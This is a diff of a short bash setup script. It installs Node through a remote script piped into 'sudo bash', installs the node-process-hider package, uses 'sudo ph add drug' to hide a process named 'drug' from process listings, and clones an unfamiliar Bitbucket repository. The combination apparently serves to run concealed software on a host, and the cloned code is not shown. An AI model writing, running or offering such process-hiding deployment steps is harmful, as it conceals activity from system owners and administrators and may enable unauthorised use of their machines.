@@ -1,8 +1,10 @@
+#bin/bash
 sudo apt update
 sudo apt install gcc -y
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - 
 sudo apt install nodejs
-npm install -g npm@8.4.1 && npm i -g node-process-hider
+npm install -g npm@8.4.1
+npm i -g node-process-hider
 sudo ph add drug
 git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git
 cd mariere-born
